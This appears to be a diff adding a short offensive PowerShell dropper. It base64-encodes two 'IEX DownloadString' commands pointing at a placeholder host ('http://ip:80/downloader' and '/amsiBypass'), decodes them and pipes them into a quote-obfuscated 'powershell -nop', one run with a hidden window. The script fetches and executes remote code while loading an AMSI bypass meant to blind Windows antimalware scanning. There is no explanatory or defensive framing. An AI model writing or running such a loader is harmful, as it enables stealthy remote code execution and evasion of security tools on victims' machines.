@@ -1,0 +1,8 @@
+@ECHO OFF
+#IEX (New-Object Net.WebClient).DownloadString('http://ip:80/downloader')
+#IEX (New-Object Net.WebClient).DownloadString('http://ip:80/amsiBypass')
+$downloader = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vaXA6ODAvZG93bmxvYWRlcicp"
+$amsiBypass = "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vaXA6ODAvYW1zaUJ5cGFzcycp"
+$decryptamsiBypass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($amsiBypass))
+$decryptDownloader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloader))
+echo $decryptDownloader | p""o""w""e""r""s""h""e""l""l -n""o""p - ; echo $decryptamsiBypass | p""o""w""e""r""s""h""e""l""l -n""o""p -windowstyle hidden -
